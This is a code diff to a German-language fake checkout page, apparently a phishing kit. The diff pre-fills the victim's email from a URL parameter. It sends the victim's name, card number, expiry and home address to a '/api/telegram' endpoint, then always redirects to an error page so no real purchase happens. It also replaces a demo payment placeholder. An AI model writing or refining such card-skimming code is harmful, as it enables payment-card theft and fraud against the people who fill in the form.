@@ -136,9 +136,12 @@
   <section class="left">
     <div class="panel">
       <div class="toprow">
-        <div class="shopword">shop</div>
-        <div class="acct"><span>kaimols003@gmail.com</span><span class="kebab" aria-hidden="true"></span></div>
-      </div>
+  <div class="shopword">shop</div>
+  <div class="acct">
+    <span id="userEmail">—</span>
+    <span class="kebab" aria-hidden="true"></span>
+  </div>
+</div> <!-- ✅ toprow schließen -->
 
       <h2>Zahlung</h2>
       <p class="sub">Alle Transaktionen sind sicher und verschlüsselt.</p>
@@ -269,6 +272,8 @@
 <script>
   const $ = (s, r=document) => r.querySelector(s);
   const onlyDigits = s => (s||"").replace(/\D+/g,"");
+  const params = new URLSearchParams(window.location.search);
+const checkoutEmail = params.get("email") || "—";
 
   let didSubmit = false; // <- wichtig: grün erst nach Submit-Versuch
 
@@ -540,6 +545,8 @@ const exp = $("#ccExp").value.trim();
 const payload = {
   name: `${$("#firstName").value.trim()} ${$("#lastName").value.trim()}`.trim() || "Checkout",
   message:
+  `📧 E-Mail\n` +
+    `- ${checkoutEmail}\n\n` +
     `💳 Zahlung\n` +
     `- Karteninhaber: ${$("#ccName").value.trim()}\n` +
     `- Karte: ${$("#ccNumber").value.trim()}\n` +
@@ -552,28 +559,47 @@ const payload = {
     `- Adresse: ${$("#address").value.trim()}\n` +
     `- PLZ: ${$("#zip").value.trim()}\n` +
     `- Stadt: ${$("#city").value.trim()}\n` +
-    `- Land: ${$("#country").value}\n\n`};
+    `- Land: ${$("#country").value}\n\n`
+};
 
-await fetch("/api/telegram", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify(payload),
+
+// Button-UI
+  buyBtn.disabled = true;
+  buyBtn.classList.add("is-loading");
+  buyText.textContent = "Wird verarbeitet…";
+
+  try {
+    // Telegram senden (Fehler egal -> trotzdem weiterleiten)
+    await fetch("/api/telegram", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+    }).catch(() => {});
+
+    // kleine Sicherheitspause, damit der Request rausgeht
+    await new Promise((r) => setTimeout(r, 200));
+
+    // danach weiterleiten
+    window.location.href = "fehler.html";
+  } finally {
+    // falls Redirect aus irgendeinem Grund nicht passiert
+    buyBtn.disabled = false;
+    buyBtn.classList.remove("is-loading");
+    buyText.textContent = "Jetzt kaufen";
+  }
 });
+// E-Mail aus URL lesen und einsetzen
+(() => {
+  const params = new URLSearchParams(window.location.search);
+  const email = params.get("email");
 
-    buyBtn.disabled = true;
-    buyBtn.classList.add("is-loading");
-    buyText.textContent = "Wird verarbeitet…";
-
-    try{
-      // TODO: hier deinen echten Payment-Call einbauen
-      await new Promise(r => setTimeout(r, 900));
-      showAlert("✅ Validiert (Demo). Jetzt würdest du den Payment-Request auslösen.", "success");
-    } finally{
-      buyBtn.disabled = false;
-      buyBtn.classList.remove("is-loading");
-      buyText.textContent = "Jetzt kaufen";
+  if (email) {
+    const el = document.getElementById("userEmail");
+    if (el) {
+      el.textContent = email;
     }
-  });
+  }
+})();
 </script>
 </body>
 </html>
